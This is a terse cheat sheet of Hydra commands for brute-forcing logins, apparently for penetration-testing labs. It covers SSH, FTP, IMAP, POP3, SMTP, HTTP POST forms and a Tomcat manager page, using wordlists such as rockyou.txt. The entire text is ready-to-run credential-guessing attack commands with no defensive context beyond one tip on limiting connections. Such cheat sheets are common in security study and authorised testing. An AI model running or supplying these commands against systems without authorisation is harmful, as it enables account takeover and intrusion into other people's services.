

`hydra -l bob -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.15`

OR

`hydra -L user.txt -p password123 ssh://10.1.1.2`

OR both!

`hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh
`

OR

```
hydra 10.0.0.1 http-post-form “/admin.php:target=auth&mode=login&user=^USER^&password=^PASS^:invalid” -P /usr/share/wordlists/rockyou.txt -l admin
```
OR

```
hydra -L etcpwdusers.txt -e nsr 192.168.111.100 ssh
```

### FTP Brute Force:
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V
```
### POP3 Brute Force:
```
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V
```
### SMTP Brute Force:
```
hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V
```
Use -t to limit concurrent connections, example: -t 15
### Web Login Form:
```
hydra -L /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -s 8080 -f 10.129.35.106 http-get /manager/html
```

### SSH:
```
hydra -l root -p admin 192.168.1.105 -t 4 ssh
```
